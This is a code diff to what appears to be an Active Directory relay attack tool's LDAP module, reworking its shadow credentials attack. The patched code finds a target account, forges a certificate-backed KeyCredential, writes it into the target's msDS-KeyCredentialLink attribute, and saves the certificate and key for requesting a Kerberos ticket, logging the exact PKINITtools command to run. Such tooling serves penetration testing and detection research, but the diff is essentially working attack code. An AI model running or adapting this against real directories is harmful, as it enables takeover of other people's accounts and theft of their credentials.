@@ -280,7 +280,7 @@ class LDAPAttack(ProtocolAttack):
             LOG.error('Failed to add user to %s group: %s' % (groupName, str(self.client.result)))
 
 
-    def shadowCredentialsAttack(self):
+    def shadowCredentialsAttack(self, ShadowCredentialsExportType="PFX"):
         LOG.info("Searching for the target account")
 
         # Get the domain we are in
@@ -288,16 +288,19 @@ class LDAPAttack(ProtocolAttack):
         domain = re.sub(',DC=', '.', domaindn[domaindn.find('DC='):], flags=re.I)[3:]
 
         # Get target computer DN
-        result = self.getUserInfo(self.targetidentity_dn)
-        if not result:
+        self.client.search(self.rootDN, f'(distinguishedName={self.targetidentity_dn})', attributes=['objectSid','sAMAccountName'])
+        result = self.client.entries
+        #result = self.getUserInfo(self.targetidentity_dn)
+        if len(result) == 0:
             LOG.error('Target account does not exist! (wrong domain?)')
             return
         else:
-            target_dn = result[0]
+            target_dn = result[0].entry_dn
+            target_sid = result[0]['objectSid'].values[0]
             LOG.info("Target user found: %s" % target_dn)
 
         LOG.info("Generating certificate")
-        certificate = X509Certificate2(subject=self.targetidentity_dn, keySize=2048, notBefore=(-40 * 365), notAfter=(40 * 365))
+        certificate = X509Certificate2(subject=target_sid, keySize=2048, notBefore=(-40 * 365), notAfter=(40 * 365))
         LOG.info("Certificate generated")
         LOG.info("Generating KeyCredential")
         keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=target_dn, currentTime=DateTime())
@@ -318,24 +321,18 @@ class LDAPAttack(ProtocolAttack):
             self.client.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
             if self.client.result['result'] == 0:
                 LOG.info("Updated the msDS-KeyCredentialLink attribute of the target object")
-                if self.config.ShadowCredentialsOutfilePath is None:
-                    path = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
-                    LOG.debug("No outfile path was provided. The certificate(s) will be store with the filename: %s" % path)
-                else:
-                    path = self.config.ShadowCredentialsOutfilePath
-                if self.config.ShadowCredentialsExportType == "PEM":
+                path = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
+                LOG.debug("No outfile path was provided. The certificate(s) will be store with the filename: %s" % path)
+                if ShadowCredentialsExportType == "PEM":
                     certificate.ExportPEM(path_to_files=path)
                     LOG.info("Saved PEM certificate at path: %s" % path + "_cert.pem")
                     LOG.info("Saved PEM private key at path: %s" % path + "_priv.pem")
                     LOG.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
                     LOG.info("Run the following command to obtain a TGT")
                     LOG.info("python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache" % (path, path, domain, self.targetidentity_dn, path))
-                elif self.config.ShadowCredentialsExportType == "PFX":
-                    if self.config.ShadowCredentialsPFXPassword is None:
-                        password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
-                        LOG.debug("No pass was provided. The certificate will be store with the password: %s" % password)
-                    else:
-                        password = self.config.ShadowCredentialsPFXPassword
+                elif ShadowCredentialsExportType == "PFX":
+                    password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
+                    LOG.debug("The certificate will be store with the password: %s" % password)
                     certificate.ExportPFX(password=password, path_to_file=path)
                     LOG.info("Saved PFX (#PKCS12) certificate & key at path: %s" % path + ".pfx")
                     LOG.info("Must be used with password: %s" % password)
@@ -560,7 +557,7 @@ class LDAPAttack(ProtocolAttack):
         return (usersid, privs)
 
     def getUserInfo(self, samname):
-        entries = self.client.search(self.rootDN, '(distinguishedName=%s)' % escape_filter_chars(samname), attributes=['objectSid'])
+        entries = self.client.search(self.rootDN, '(sAMAccountName=%s)' % escape_filter_chars(samname), attributes=['objectSid'])
         try:
             dn = self.client.entries[0].entry_dn
             sid = format_sid(self.client.entries[0]['objectSid'])
